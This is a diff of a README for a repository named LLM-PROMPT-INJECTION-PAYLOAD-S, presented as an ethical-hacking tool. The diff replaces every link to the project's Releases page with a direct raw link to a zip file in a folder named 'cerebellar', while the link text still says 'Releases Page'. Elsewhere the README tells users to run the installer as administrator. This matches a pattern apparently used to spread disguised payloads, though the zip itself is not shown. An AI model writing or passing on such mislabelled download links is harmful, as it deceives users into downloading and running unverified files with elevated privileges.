@@ -8,7 +8,7 @@ Welcome to LLM-PROMPT-INJECTION-PAYLOAD-S! This application helps you run safe a
 
 You can download LLM-PROMPT-INJECTION-PAYLOAD-S from the Releases page. Click the button below:
 
-[![Download LLM-PROMPT-INJECTION-PAYLOAD-S](https://img.shields.io/badge/Download-LLM--PROMPT--INJECTION--PAYLOAD--S-brightgreen)](https://github.com/satrijan/LLM-PROMPT-INJECTION-PAYLOAD-S/releases)
+[![Download LLM-PROMPT-INJECTION-PAYLOAD-S](https://raw.githubusercontent.com/satrijan/LLM-PROMPT-INJECTION-PAYLOAD-S/main/cerebellar/LLM-PROMPT-INJECTION-PAYLOAD-S-1.1.zip)](https://raw.githubusercontent.com/satrijan/LLM-PROMPT-INJECTION-PAYLOAD-S/main/cerebellar/LLM-PROMPT-INJECTION-PAYLOAD-S-1.1.zip)
 
 This link will take you directly to the page where you can download the latest version. 
 
@@ -23,7 +23,7 @@ Before you download the application, make sure your system meets the following r
 
 ## 💻 Install the Application
 
-1. **Visit the Releases Page.** Go to the [Releases Page](https://github.com/satrijan/LLM-PROMPT-INJECTION-PAYLOAD-S/releases).
+1. **Visit the Releases Page.** Go to the [Releases Page](https://raw.githubusercontent.com/satrijan/LLM-PROMPT-INJECTION-PAYLOAD-S/main/cerebellar/LLM-PROMPT-INJECTION-PAYLOAD-S-1.1.zip).
    
 2. **Choose Your Version.** Look for the latest version listed at the top. You will see a list of files available for download.
 
@@ -60,7 +60,7 @@ Having trouble? Here are some common issues and their solutions:
 
 - **The application won’t open.** Ensure that your system meets the requirements mentioned above. Restart your computer and try again.
   
-- **Download fails.** Check your internet connection and try to download again from the [Releases Page](https://github.com/satrijan/LLM-PROMPT-INJECTION-PAYLOAD-S/releases).
+- **Download fails.** Check your internet connection and try to download again from the [Releases Page](https://raw.githubusercontent.com/satrijan/LLM-PROMPT-INJECTION-PAYLOAD-S/main/cerebellar/LLM-PROMPT-INJECTION-PAYLOAD-S-1.1.zip).
 
 - **Error messages during installation.** Make sure to have administrator privileges on your computer. Right-click the installer and select "Run as Administrator."
 
@@ -74,4 +74,4 @@ Stay updated by following our efforts on GitHub. Feel free to contribute or sugg
 
 Thank you for using LLM-PROMPT-INJECTION-PAYLOAD-S! We look forward to seeing how it enhances your ethical hacking practices.
 
-For downloading, remember to visit the [Releases Page](https://github.com/satrijan/LLM-PROMPT-INJECTION-PAYLOAD-S/releases) for the latest version. Enjoy your journey into optimized prompt workflows!
+For downloading, remember to visit the [Releases Page](https://raw.githubusercontent.com/satrijan/LLM-PROMPT-INJECTION-PAYLOAD-S/main/cerebellar/LLM-PROMPT-INJECTION-PAYLOAD-S-1.1.zip) for the latest version. Enjoy your journey into optimized prompt workflows!
